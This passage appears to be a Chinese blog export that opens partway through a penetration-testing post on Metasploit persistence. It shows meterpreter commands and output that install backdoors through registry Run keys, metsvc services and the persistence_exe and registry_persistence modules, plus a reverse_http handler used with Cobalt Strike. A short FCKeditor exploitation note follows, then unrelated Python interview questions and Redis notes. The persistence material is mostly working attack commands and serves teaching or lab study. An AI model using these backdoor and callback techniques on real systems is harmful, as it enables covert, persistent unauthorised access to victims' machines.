Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444[*] Persistent agent script is 99630 bytes long[+] Persistent Script written to C:\\Users\\TideSec\\AppData\\Local\\Temp\\qexwcMF.vbs[*] Executing script C:\\Users\\TideSec\\AppData\\Local\\Temp\\qexwcMF.vbs[+] Agent executed with PID 3540[*] Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\qrsXZuPqVbEgua[+] Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\qrsXZuPqVbEgua 能实现同样功能的脚本还有：exploit&#x2F;windows&#x2F;local&#x2F;persistence 2.metsvc服务后门 在C:\\Users\\AppData\\Local\\Temp\\目录下，上传一个vbs脚本在注册表HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\加入开机启动项。通过服务启动，需要管理员权限，官方不推荐使用，运行失败* 123456789101112131415161718192021222324run metsvc –A #自动安装后门# 示例meterpreter &gt; run metsvc –A[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.[!] Example: run post/windows/manage/persistence_exe OPTION=value [...][*] Creating a meterpreter service on port 31337[*] Creating a temporary installation directory C:\\Users\\TideSec\\AppData\\Local\\Temp\\iInvhjKZbLH...[*] &gt;&gt; Uploading metsrv.x86.dll...[*] &gt;&gt; Uploading metsvc-server.exe...[*] &gt;&gt; Uploading metsvc.exe...[*] Starting the service... Cannot open service manager (0x00000005)meterpreter &gt; lsListing: C:\\Users\\TideSec\\AppData\\Local\\Temp\\iInvhjKZbLH========================================================Mode Size Type Last modified Name---- ---- ---- ------------- ----100666/rw-rw-rw- 178688 fil 2019-06-12 06:46:20 -0700 metsrv.dll100777/rwxrwxrwx 45056 fil 2019-06-12 06:46:21 -0700 metsvc-server.exe100777/rwxrwxrwx 61440 fil 2019-06-12 06:46:21 -0700 metsvc.exe 三个文件上传成功，但服务没有启动起来，失败了。使用-r参数可卸载服务。 3.persistence_exe 再来看看官方推荐的东西吧 123456789101112131415161718192021222324252627282930313233343536373839meterpreter &gt; info post/windows/manage/persistence_exe Name: Windows Manage Persistent EXE Payload Installer Module: post/windows/manage/persistence_exe Platform: Windows Arch: Rank: NormalProvided by: Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;Compatible session types: MeterpreterBasic options: Name Current Setting Required Description ---- --------------- -------- ----------- REXENAME default.exe yes The name to call exe on remote system REXEPATH yes The remote executable to upload and execute. SESSION yes The session to run this module on. STARTUP USER yes Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)Description: This Module will upload an executable to a remote host and make it Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER will start on user login, SYSTEM will start on system boot but requires privs. SERVICE will create a new service which will start the payload. Again requires privs.Module options (post/windows/manage/persistence_exe): Name Current Setting Required Description ---- --------------- -------- ----------- REXENAME default.exe yes The name to call exe on remote system REXEPATH yes The remote executable to upload and execute. SESSION yes The session to run this module on. STARTUP USER yes Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE) 此模块将可执行文件上载到远程主机并进行创建持久性。涉及到四个参数 REXENAME是拷贝到目标系统中的名字 EXEPATH是将要上传的后门在本地的位置 SESSION是选择运行此模块的会话 STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。 尝试一下： 12345678910meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER[*] Running module against SAUCERMAN[*] Reading Payload from file /home/ubuntu/shell.exe[+] Persistent Script written to C:\\Users\\TideSec\\AppData\\Local\\Temp\\backdoor.exe[*] Executing script C:\\Users\\TideSec\\AppData\\Local\\Temp\\backdoor.exe[+] Agent executed with PID 3684[*] Installing into autorun as HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\mEMZDQOxkkeebI[+] Installed into autorun as HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\mEMZDQOxkkeebI[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc 4.registry_persistence 完整路径为exploit&#x2F;windows&#x2F;local&#x2F;registry_persistence 和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。 1234567891011121314151617181920212223242526272829303132333435363738meterpreter &gt; background[*] Backgrounding session 13...msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistencemsf5 exploit(windows/local/registry_persistence) &gt; show optionsModule options (exploit/windows/local/registry_persistence): Name Current Setting Required Description ---- --------------- -------- ----------- BLOB_REG_KEY no The registry key to use for storing the payload blob. (Default: random) BLOB_REG_NAME no The name to use for storing the payload blob. (Default: random) CREATE_RC true no Create a resource file for cleanup RUN_NAME no The name to use for the &#x27;Run&#x27; key. (Default: random) SESSION yes The session to run this module on. SLEEP_TIME 0 no Amount of time to sleep (in seconds) before executing payload. (Default: 0) STARTUP USER yes Startup type for the persistent payload. (Accepted: USER, SYSTEM)Exploit target: Id Name -- ---- 0 Automaticmsf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13SESSION =&gt; 13msf5 exploit(windows/local/registry_persistence) &gt; run[*] Generating payload blob..[+] Generated payload, 6048 bytes[*] Root path is HKCU[*] Installing payload blob..[+] Created registry key HKCU\\Software\\0BaG3zDR[+] Installed payload blob to HKCU\\Software\\0BaG3zDR\\iiEB4InD[*] Installing run key[+] Installed run key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SMPqA5kB[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc 同类型的还有其他payload，如exploit&#x2F;windows&#x2F;local&#x2F;vss_persistence，exploit&#x2F;windows&#x2F;local&#x2F;s4u_persistence。 cs大全cs派生msf 123456789msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_httpmsf exploit(handler) &gt; set lhost 192.168.0.143msf exploit(handler) &gt; set lport 4444msf exploit(handler) &gt; exploitcs创建一个windows/foreign/reverse_http的 Listener然后选中对应机器，右键-&gt;Spawn，选择刚刚创建的监听器。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"cs","slug":"cs","permalink":"http://example.com/tags/cs/"},{"name":"命令","slug":"命令","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4/"},{"name":"namp","slug":"namp","permalink":"http://example.com/tags/namp/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"}]},{"title":"fck编辑器漏洞利用","slug":"fck编辑器漏洞利用","date":"2022-04-22T11:11:01.000Z","updated":"2022-05-09T11:32:35.845Z","comments":true,"path":"2022/04/22/fck编辑器漏洞利用/","permalink":"http://example.com/2022/04/22/fck%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","excerpt":"","text":"fck编辑器漏洞利用FCKEditor 富文本编辑器 FCKeditor简介1FCKeditor是一个专门使用在网页上属于开放源代码的所见即所得文字编辑器。它志于轻量化，不需要太复杂的安装步骤即可使用。它可和PHP、 JavaScript、ASP、ASP.NET、ColdFusion、Java、以及ABAP等不同的编程语言相结合。“FCKeditor”名称中的 “FCK” 是这个编辑器的作者的名字Frederico Caldeira Knabben的缩写。FCKeditor 相容于绝大部分的网页浏览器，像是 : Internet Explorer 5.5+ (Windows)、Mozilla Firefox 1.0+、Mozilla 1.3+ 和 Netscape 7+。在未来的版本也将会加入对 Opera 的支援。 判断版本12/fckeditor/editor/dialog/fck_about.html/FCKeditor/_whatsnew.html FCK综合利用工具","categories":[],"tags":[]},{"title":"python面试题1","slug":"python面试题-0","date":"2020-11-20T02:34:44.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/11/20/python面试题-0/","permalink":"http://example.com/2020/11/20/python%E9%9D%A2%E8%AF%95%E9%A2%98-0/","excerpt":"python面试题","text":"python面试题 python面试题简述面向对象中__new__和__init__区别 123456789__init__是初始化方法，创建对象后，就立刻被默认调用了，可接收参数1、__new__至少要有一个参数cls，代表当前类，此参数在实例化时由Python解释器自动识别2、__new__必须要有返回值，返回实例化出来的实例，这点在自己实现__new__时要特别注意，可以return父类（通过super(当前类名, cls)）__new__出来的实例，或者直接是object的__new__出来的实例3、__init__有一个参数self，就是这个__new__返回的实例，__init__在__new__的基础上可以完成一些其它初始化的动作，__init__不需要返回值4、如果__new__创建的是当前类的实例，会自动调用__init__函数，通过return语句里面调用的__new__函数的第一个参数是cls来保证是当前类实例，如果是其他类的类名，；那么实际创建返回的就是其他类的实例，其实就不会调用当前类的__init__函数，也不会调用其他类的__init__函数。 简述with方法打开处理文件帮我我们做了什么？ 1打开文件在进行读写的时候可能会出现一些异常状况，如果按照常规的f.open写法，我们需要try,except,finally，做异常判断，并且文件最终不管遇到什么情况，都要执行finally f.close()关闭文件，with方法帮我们实现了finally中f.close python中生成随机整数、随机小数、0–1之间小数方法 12345随机整数：random.randint(a,b),生成区间内的整数随机小数：习惯用numpy库，利用np.random.randn(5)生成5个随机小数0-1随机小数：random.random(),括号中不传参 python2和python3区别？列举5个 1234567891011121314151、Python3 使用 print 必须要以小括号包裹打印内容，比如 print(&#x27;hi&#x27;) Python2 既可以使用带小括号的方式，也可以使用一个空格来分隔打印内容，比如 print &#x27;hi&#x27;2、python2 range(1,10)返回列表，python3中返回迭代器，节约内存3、python2中使用ascii编码，python中使用utf-8编码4、python2中unicode表示字符串序列，str表示字节序列 python3中str表示字符串序列，byte表示字节序列5、python2中为正常显示中文，引入coding声明，python3中不需要6、python2中是raw_input()函数，python3中是input()函数 列出python中可变数据类型和不可变数据类型，并简述原理 1234567# 不可变数据类型：数值型、字符串型string和元组tuple不允许变量的值发生变化，如果改变了变量的值，相当于是新建了一个对象，而对于相同的值的对象，在内存中则只有一个对象（一个地址）# 可变数据类型：列表list和字典dict；允许变量的值发生变化，即如果对变量进行append、+=等这种操作后，只是改变了变量的值，而不会新建一个对象，变量引用的对象的地址也不会变化，不过对于相同的值的不同对象，在内存中则会存在不同的对象，即每个对象都有自己的地址，相当于内存中对于同值的对象保存了多份，这里不存在引用计数，是实实在在的对象。 说明zip（）函数用法 123zip()函数在运算时，会以一个或多个序列（可迭代对象）做为参数，返回一个元组的列表。同时将这些序列中并排的元素配对。zip()参数可以接受任何类型的序列，同时也可以有两个以上的参数;当传入参数的长度不同时，zip能自动以最短序列长度为准进行截取，获得元组。 提高python运行效率的方法 123451、使用生成器，因为可以节约大量内存2、循环代码优化，避免过多重复代码的执行3、核心模块用Cython PyPy等，提高效率4、多进程、多线程、协程5、多个if elif条件判断，可以把最有可能先发生的条件放到前面写，这样可以减少程序判断的次数，提高效率 写一个单列模式 1234567891011121314151617#因为创建对象时__new__方法执行，并且必须return 返回实例化出来的对象所cls.__instance是否存在，不存在的话就创建对象，存在的话就返回该对象，来保证只有一个实例对象存在（单列），打印ID，值一样，说明对象同一个class Singleton(object): __instance = None def __new__(cls,age,name): # 如果类属性__instance的值为None # 那么就创建一个对象,并且赋值为这个对象的引用,保证下次调用这个方法时 # 能够知道之前已经创建过对象了,这样保证只有一个对象 if not cls.__instance: cls.__instance = object.__new__(cls) return cls.__instancea = Singleton(18,&quot;dong&quot;)b = Singleton(8,&quot;dong&quot;)print(id(a))print(id(b))a.age = 19print(b.age) 列出常见的状态码和意义 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455200 OK 请求正常处理完毕204 No Content 请求成功处理，没有实体的主体返回206 Partial Content GET范围请求已成功处理301 Moved Permanently 永久重定向，资源已永久分配新URI302 Found 临时重定向，资源已临时分配新URI303 See Other 临时重定向，期望使用GET定向获取304 Not Modified 发送的附带条件请求未满足307 Temporary Redirect 临时重定向，POST不会变成GET400 Bad Request 请求报文语法错误或参数错误401 Unauthorized 需要通过HTTP认证，或认证失败403 Forbidden 请求资源被拒绝404 Not Found 无法找到请求资源（服务器无理由拒绝）500 Internal Server Error 服务器故障或Web应用故障503 Service Unavailable 服务器超负载或停机维护 列出常见MYSQL数据存储引擎 12345**InnoDB**：支持事务处理，支持外键，支持崩溃修复能力和并发控制。如果需要对事务的完整性要求比较高（比如银行），要求实现并发控制（比如售票），那选择InnoDB有很大的优势。如果需要频繁的更新、删除操作的数据库，也可以选择InnoDB，因为支持事务的提交（commit）和回滚（rollback）。 **MyISAM**：插入数据快，空间和内存使用比较低。如果表主要是用于插入新记录和读出记录，那么选择MyISAM能实现处理高效率。如果应用的完整性、并发性要求比 较低，也可以使用。**MEMORY**：所有的数据都在内存中，数据的处理速度快，但是安全性不高。如果需要很快的读写速度，对数据的安全性要求较低，可以选择MEMOEY。它对表的大小有要求，不能建立太大的表。所以，这类数据库只使用在相对较小的数据库表。 简述同源策略 123456789101112131415同源策略需要同时满足以下三点要求： 1）协议相同 2）域名相同 3）端口相同 http:www.test.com与https:www.test.com 不同源——协议不同 http:www.test.com与http:www.admin.com 不同源——域名不同 http:www.test.com与http:www.test.com:8081 不同源——端口不同 只要不满足其中任意一个要求，就不符合同源策略，就会出现“跨域” 简述多线程、多进程 1234567891011121314151617## 进程： 1、操作系统进行资源分配和调度的基本单位，多个进程之间相互独立2、稳定性好，如果一个进程崩溃，不影响其他进程，但是进程消耗资源大，开启的进程数量有限制## 线程： 1、CPU进行资源分配和调度的基本单位，线程是进程的一部分，是比进程更小的能独立运行的基本单位，一个进程下的多个线程可以共享该进程的所有资源2、如果IO操作密集，则可以多线程运行效率高，缺点是如果一个线程崩溃，都会造成进程的崩溃## 应用： IO密集的用多线程，在用户输入，sleep 时候，可以切换到其他线程执行，减少等待的时间CPU密集的用多进程，因为假如IO操作少，用多线程的话，因为线程共享一个全局解释器锁，当前运行的线程会霸占GIL，其他线程没有GIL，就不能充分利用多核CPU的优势 ** is 和 &#x3D;&#x3D; 的区别 ** is 表示的是对象标示符（object identity），而 &#x3D;&#x3D; 表示的是相等（equality）。 is 的作用是用来检查对象的标示符是否一致，也就是比较两个对象在内存中的地址是否一样，而 &#x3D;&#x3D; 是用来检查两个对象是否相等。但是为了提高系统性能，对于较小的字符串 Python 会保留其值的一个副本，当创建新的字符串的时候直接指向该副本即可。 1234567如：###a = 8b = 8a is b ** 文件读写** 简述文件读取时 read 、readline、readlines 的区别和作用 他们的区别除了读取内容范围不同外，返回的内容类型也不同。 - read()会读取整个文件，将读取到底的文件内容放到一个字符串变量，返回 str 类型。 - readline()读取一行内容，放到一个字符串变量，返回 str 类型。 - readlines() 读取文件所有内容，按行为单位放到一个列表中，返回 list 类型。","categories":[],"tags":[{"name":"面试题","slug":"面试题","permalink":"http://example.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"}]},{"title":"redis数据库","slug":"Redis_01","date":"2020-11-20T01:41:29.000Z","updated":"2022-04-08T16:55:55.912Z","comments":true,"path":"2020/11/20/Redis_01/","permalink":"http://example.com/2020/11/20/Redis_01/","excerpt":"Redis数据库的学习笔记","text":"Redis数据库的学习笔记 Redis数据库一、NoSQL简介NoSQL，泛指非关系型的数据库，有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的的统称。 SQL (Structured Query Language) 数据库，指关系型数据库。主要代表：SQL Server，Oracle，MySQL，PostgreSQL。存储数据时，需要预先定义表，字段–关系表 NoSQL（Not Only SQL）泛指非关系型数据库。主要代表：MongoDB，Redis，CouchDB。无表无关联 SQL和NoSQL对比： SQL通常以数据库表形式存储数据。举个栗子，存个学生借书数据： 而NoSQL存储方式比较灵活，比如使用类JSON文件存储上表中熊大的借阅数据： 关系型数据库瓶颈 高并发读写需求 针对网站类用户的并发性访问非常高，而一台数据库的最大连接数有限，且硬盘I&#x2F;O有限，其不能满足很多人同时连接 海量数据的高效率读写 网站每天产生的数据量是巨大的，对于关系型数据库来说，在一张包含海量数据的表中查询，效率是非常低的 查：关系性数据库和非关系性数据库的区别 查：MySQL 与Redis的区别 二、Redis简介1、Redis是什么？ 速度非常快的Nosql数据库，基于key-value的内存存储，同时支持数据持久化到硬盘。 2、Redis的特点 高性能 数据类型丰富 基于内存存储，又支持持久化（将内存中的数据保存到硬盘中） 三、Redis安装1、解压将redis的tar包发送到Linux中，并解压： tar -zxvf redis-3.0.7.tar.gz 2、make指令cd指令切换到解压目录中，然后执行指令: make 执行make的时候，如出现异常： 异常一： make[2]: cc: Command not found 异常原因：没有安装gcc 解决方案：yum install gcc 异常二： zmalloc.h:51:31: error: jemalloc/jemalloc.h: No such file or directory 异常原因：一些编译依赖或原来编译遗留出现的问题 解决方案：make distclean。清理一下，然后再make。 3、make test (直接跳过)在make成功以后，执行指令：make test 在make test时出现异常： 异常一： couldn&#39;t execute &quot;tclsh8.5&quot;: no such file or directory 异常原因：没有安装tcl 解决方案：yum install -y tcl。 4、make install安装，执行指令：make install 5、启动服务 第一种：前台模式，默认配置启动(默认端口6379) 直接执行指令：redis-server 第二种：守护进程(后台)模式,指定配置文件启动 在redis解压根目录中找到配置文件模板(redis.conf)，复制到如下位置： 123cp redis.conf /usr/local/redis_conf/redis.conf# 1. 上述的指令是在redis的解压目录下执行的# 2. redis_conf目录是自己创建的 名字是自定义的 通过vi命令修改 123456789daemonize yes #守护进程模式启动 -- 后台port 7000 #端口 也可以不改pidfile ./redis.pid #进程id存储位置logfile ./redis.log #日志文件存储位置dir /usr/local/redis_conf/ #工作目录 rdb、aof文件存储位置 然后执行 redis-server redis.conf 6、连接Redis执行指令： redis-cli 连接端口为6379 Host为127.0.0.1的redis服务器 redis-cli -p 7000 -h 192.168.1.103 连接端口为7000 Host为192.168.1.103的redis服务器 7、关闭服务redis-cli连接了redis服务器后，可以通过 shutdown 指令关闭连接，并关闭服务 或在命令行中执行 redis-cli -p 7000 shutdown 如果只想关闭连接（客户端），在redis命令中，按Ctrl+c 即可，此时服务不会被关闭 123456789# 关闭连接： 在交互界面，ctrl + c即可，退出交互式界面# 关闭服务： 1. 在交互式界面，输入shutdown指令 2. 在命令行界面，输入连接的指令+shutdown redis-cli -p 7000 shutdown 3. 通过进程号杀掉进程 ps -ef | grep redis kill -9 进程号 四、Redis数据类型Redis支持五种数据类型：string（字符串），list（列表），set（集合）及zset(sorted set：有序集合)，hash（哈希）。 123456# redis数据可以看作是一个大的字典，所有的数据都是以键值对的形式的存在的&#123; 键1：值1， 键2：值2&#125;# 键一般为字符串类型,值的类型可以是以上5种数据类型 1、String字符串用于存单值，常用指令： 命令 说明 示例 set 设置一个key&#x2F;value set name Mr_lee get 根据key获得对应的value get name (keys * &#x2F; keys n*) mset 一次设置多个key value mset age 18 salary 3000 mget 一次获得多个key的value mget name age getset 获得原始key的值，同时设置新值 getset age 20 del 删除key-value del name strlen 获得对应key存储value的长度 strlen name append 为对应key的value追加内容 appdend name 123 getrange 截取value的内容,对原始的值没有影响 getrange name 0 2 setex 设置一个key存活的有效期（秒） setex name 10 tom psetex 设置一个key存活的有效期（毫秒） psetex course10000 redis setnx 只有当这个key不存在时等效set操作 not exist sexnx birth 2020-2-2 msetnx 可以同时设置多个key，在key不存在时有效 msetnx course mysql duration 4 decr 进行数值类型的-1操作 decr age decrby 根据提供的数据进行减法操作 decrby age 3 incr 进行数值类型的+1操作 incr age incrby 根据提供的数据进行加法操作 incrby age 3 incrbyfloat 根据提供的数据加入浮点数 incrbyfloat age 3.5 2、List列表存储多值，常用指令： 1234# python&#123; &#x27;hobby&#x27;:[&#x27;吃饭&#x27;,&#x27;睡觉&#x27;,&#x27;打豆豆&#x27;]&#125; 命令 说明 示例 lpush 将某个值加入到一个key列表头部 lpush users tom lpushx 同lpush,但是必须要保证这个key存在 lpushx users jack rpush 将某个值加入到一个key列表末尾 rpush users linda rpushx 同rpush,但是必须要保证这个key存在 rpushx users james lpop 返回和移除列表的第一个元素 lpop users rpop 返回和移除列表的最后一个元素 rpop users lrange 获取某一个下标区间内的元素 lrange users 0 3 &#x2F; lrange users 0 -1 llen 获取列表元素个数 llen users lset 设置某一个位置的元素(替换已有的某个值) lset users 2 andy lindex 获取某一个位置的元素 lindex users 2 lrem 从列表头起，删除对应个数的指定元素 lrem users 2 james ltrim 保留列表中特定区间内的元素,将其它的元素删除 – 切片 ltrim users 1 3 linsert 在某一个元素之前，之后插入新元素 linsert users before&#x2F;after jack Macle 3、Set集合set是无序集合，并且不允许有相同的元素 常用指令： 命令 说明 示例 sadd 为集合添加元素 sadd st tom smembers 显示集合中所有元素 无序 smembers st scard 返回集合中元素的个数 scard st spop 随机返回并移除一个元素 spop st smove 从一个集合中向另一个集合移动元素 smove st1 st2 tom srem 从集合中删除一个元素 srem st tom sismember 判断一个集合中是否含有这个元素 sismember st tom srandmember 随机返回元素，对原始数据没有影响 srandmember st sdiff 减去两个集合中共有的元素 求差集 sdiff st1 st2 sinter 求交集 sinter st1 st2 sunion 求并集 sunion st1 st2 4、Zset有序集合常用指令： 命令 说明 示例 zadd 添加一个有序集合元素，根据元素的score排序 zadd salary 3000 tom 2000 jack zcard 返回集合的元素个数 zcard salary zrange 返回一个范围内的元素 zrange salary 1 2 withscores zrangebyscore 按照分数查找一个范围内的元素 zrangebyscore salary 1000 2000 zrank 返回对应元素的排名 zrank salary tom zrevrank 返回对应元素倒序排名 zrevrank salary tom zscore 显示某一个元素的分数 zscore salary tom zrem 移除某一个元素 zrem salary tom zincrby 给某个特定元素加分 zincrby salary 100 tom 5、Hash哈希12345678910111213# redis是一个大字典，里面存储的是各种类型的键值对&#123; &#x27;键&#x27;：字符串， &#x27;键&#x27;：列表 []， &#x27;键&#x27;：集合&#123;&#125;， &#x27;键&#x27;：有序集合&#123;0,1,2&#125;， &#x27;键&#x27;：hash&#123;键：值&#125;，&#125;&#123; &quot;user&quot;:&#123;&quot;name&quot;:&quot;Tom&quot;,&quot;age&quot;:18&#125;&#125; 常用指令： 命令 说明 示例 hset 设置一个key&#x2F;value对 hset user name tom hget 获得一个key对应的value hget user name hgetall 获得所有的key&#x2F;value对 hgetall user hdel 删除某一个key&#x2F;value对 hdel user name hexists 判断一个key是否存在 hexists user name hkeys 获得所有的key hkeys user hvals 获得所有的value hvals user hmset 设置多个key&#x2F;value hmset user name tom gender true hmget 获得多个key的value hmget user name age hsetnx 设置一个不存在的key的值 hsetnx user salary 4000 hincrby 为value进行加法运算 hincrby user age 3 hincrbyfloat 为value加入浮点值 hincrbyfloat user age 3.5 五、Redis持久化1、什么是持久化？持久化的含义就是把内存中的数据保存到可永久存储的设备中（磁盘中），以便数据可以重用。 Redis 存：读内存中Redis数据 -&gt; 通过持某种久化的方式 -&gt; 存储到磁盘的文件中 内存-&gt;文件 取：读磁盘文件中的数据 -&gt; 内存中 文件-&gt;内存 众所周知，redis是内存数据库，它把数据存储在内存中，这样在加快读取速度的同时也对数据安全性产生了新的问题，即当redis所在服务器发生宕机后（或服务器进程退出 ），redis数据库里的所有数据将会全部丢失。 为了解决这个问题，redis提供了持久化功能： RDB持久化（snapshotting快照 - 原理是在某个时刻将Redis在内存中的数据库记录dump到磁盘上的RDB文件中实现持久化） AOF持久化（append only file - 原理是将Redis的操作日志以追加的方式写入文件）。 通俗的讲就是将内存中的数据写入硬盘中，当redis重启后，可以从磁盘中恢复数据。 2、RDB持久化2.1 RDB开发步骤编辑redis.conf文件： 123456save 900 1 #900秒内超过1个key被修改 save 300 10 #300秒内超过10个key被修改save 60 10000dbfilename dump.rdb #快照文件名stop-writes-on-bgsave-error yes #快照失败后是否继续写操作rdbcompression yes #是否压缩快照文件 2.2 RDB运行原理 在某些时刻（满足rdb持久化的时刻），Redis通过fork产生子进程，一个父进程的快照(副本)， 其中有和父进程当前时刻相同的数据 父进程继续处理client请求，子进程负责将快照(数据副本)写入临时文件(默认文件名为dump.rdb) 子进程写完后，用临时文件替换原来的快照文件，然后子进程退出。 2.3 RDB触发方式 根据配置 save 900 1 等，在满足条件时自动触发 手动执行 bgsave 指令触发 在后台保存 手动执行 save指令触发，但会造成持久化过程中的主进程阻塞。在主进程阻塞期间，服务器不能处理客户端的任何请求。 （不常用） 如果数据量很大时可以考虑使用，因为不用创建子进程，也就没有子进程抢资源，所以save在生成快照时可以更快(夜深人静时手动触发) 当通过 shutdown 关闭redis时，会自动触发 2.4 RDB注意事项 如果发生系统崩溃，则会丢失最近一次rdb之后的数据，所以如果项目不能接受这样的数据损失，则不建议使用rdb 如果数据量巨大，则创建子进程的时间长，导致redis卡顿，要谨慎设置save参数时间间隔大一些；或如果软件允许，可以每天在闲时手动同步 将生成的快照文件，留在原地，则可以在重启redis后，恢复数据状态 将生成的快照文件，复制到其它redis服务中，可以方便的将数据移植过去 3、AOF持久化Append-Only File（AOF）：与RDB的保存整个redis数据库状态不同，AOF是通过保存对redis服务端的写命令（如set、sadd、rpush）来记录数据库状态的，即保存你对redis数据库的写操作记录。 3.1 AOF运行机制Redis将每一个写操作(执行成功)，写入aof文件，即记录所有的数据改动行为，Redis重启时只要从头到尾执行一次aof文件中的命令，即可恢复数据，也可以将aof文件复制到别的服务器，做数据移植。 注意：在重启时，要恢复数据，如果rdb文件和aof文件同时存在，以AOF为准。 3.2 AOF配置编辑redis.conf文件： 123456789appendonly yes #启动AOF机制# appendfsync always #每次收到写命令就立即强制写入磁盘，保证完全的持久化，但产生极大的IO开销(不推荐使用)appendfsync everysec #每秒钟强制写入磁盘一次，在性能和持久化方面做了很好的折中(推荐使用）# appendfsync no #完全依赖os，虽然基本不对redis性能产生影响，但操作系统的缓存区满时，会阻塞redis(不推荐使用)appendfilename &quot;appendonly.aof&quot; # 设置aof文件名 3.3 AOF细节 AOF文件会不断增长(可能比快照文件大几倍)，在极端情况下，可能会对硬盘空间造成压力 Redis重启时，需要重新执行一个可能非常大的AOF，时间会很长 AOF同步时间间隔小，数据更安全，理论上至多丢失1秒的数据 4、RDB与AOF对比 RDB体量更小，AOF文件体量更大 RDB的同步时间间隔大，AOF同步时间间隔小，所以AOF更能保证数据的安全 RDB有更快的恢复速度，可以用来做数据版本控制。RDB每次进行快照方式会重新记录整个数据集的所有信息。RDB在恢复数据时更快，可以最大化redis性能。 通过使用RDB和AOF，用户可以在重启或系统崩溃后保留数据，但随着负载量变大和数据安全越来越重要，可以使用redis的复制特性做更好的数据安全保障 RDB可以做数据备份，并且要求数据恢复快，对数据一致性要求不高时 123456区别：1. RDB保存的是二进制数据，而AOF保存的是写操作的记录2. RDB是每次保存整个的数据集，而AOF是追加操作3. RDB体量小，AOF体量大4. RDB恢复速度快，而AOF恢复速度慢5. RDB的同步时间间隔大，而AOF同步时间间隔小 5、AOF重写5.1 重写设置AOF采用文件追加的方式持久化数据，所以文件会越来越大，为了避免这种情况发生，增加了重写机制。 为了减小aof文件的体量，可以手动发送 bgrewriteaof 命令，则会创建子进程，通过移除aof文件中的冗余命令来重写aof文件，生成更小体量的aof，然后替换掉旧的、大体量的aof文件 也可以设置：auto-aof-rewrite-percentage 100 ​ auto-aof-rewrite-min-size 64mb 在体量超过64mb，且比上次重写后的体量增加了100%时自动触发重写 5.2 重写原理Redis将AOF重写程序放到子进程（后台）里执行。这样处理的最大好处是： 子进程进行AOF重写期间，主进程可以继续处理命令请求； 子进程带有主进程的数据副本，使用子进程而不是线程，保证数据的安全性。 子进程进行AOF重写的问题： 子进程在进行AOF重写期间，服务器主进程还要继续处理命令请求，而新的命令可能对现有的数据进行修改，这会让当前数据库的数据和&#96;。 解决方案： 为了解决这种数据不一致的问题，Redis增加了一个AOF重写缓存，这个缓存在fork出子进程之后开始启用，Redis服务器主进程在执行完写命令之后，会同时将这个写命令追加到AOF文件和AOF重写缓冲区 即子进程在执行AOF重写时，主进程需要执行以下三个工作： 执行client发来的命令请求； 将写命令追加到现有的AOF文件中； 将写命令追加到AOF重写缓存中。 六、Redis主从1、 简介在高负载和对数据要求高完整性时，数据的复制是不可或缺的。一个Redis主服务器，并为其关联多个从服务器，主服务器会将自己的数据状态不断地同步给从服务器，即，从服务器中会持有主服务器最新的数据副本，则首先为数据完整性提供了进一步的保证，而且所有读取操作都可均衡的负载到多个从服务器中，主服务器主要负责写操作。则主从多个服务器实现读写分离，提供更好的数据完整性，和更强的负载能力。 2、主从配置开启两个redis服务器，一个做主服务器，另一个做从服务器。主从两台服务器的配置没有额外的改变，只是在从服务器的配置中添加一句配置： 12345replicaof host port 比如：replicaof 192.168.1.103 7000则如上配置将当前的redis服务器设置为(192.168.1.103:7000)的从服务器# 注意：需要开放主服务器的ip# 在主服务器的 redis.conf文件中 修改bind 0.0.0.0 如此，则主服务器的所有数据会在初始接收到从服务器的连接时全部发送到从服务器。之后每次主服务器执行完一个写操作，都会发送到从服务器。如上则是主从的运行模式。 可以向如上设置多台从服务器，则以后的所有读取操作由从服务器完成，主服务器只负责写操作。","categories":[{"name":"redis","slug":"redis","permalink":"http://example.com/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"http://example.com/tags/redis/"}]},{"title":"redis集群","slug":"Redis_02","date":"2020-11-20T01:41:29.000Z","updated":"2022-04-08T16:55:20.121Z","comments":true,"path":"2020/11/20/Redis_02/","permalink":"http://example.com/2020/11/20/Redis_02/","excerpt":"Redis数据库的集群学习笔记","text":"Redis数据库的集群学习笔记 Redis-集群一、简介Redis 在3.0版本前只支持单实例模式，虽然支持主从模式部署来解决单点故障，但是现在互联网企业动辄大几百G的数据，完全无法满足业务的需求，所以，Redis 在 3.0 版本以后就推出了集群模式。 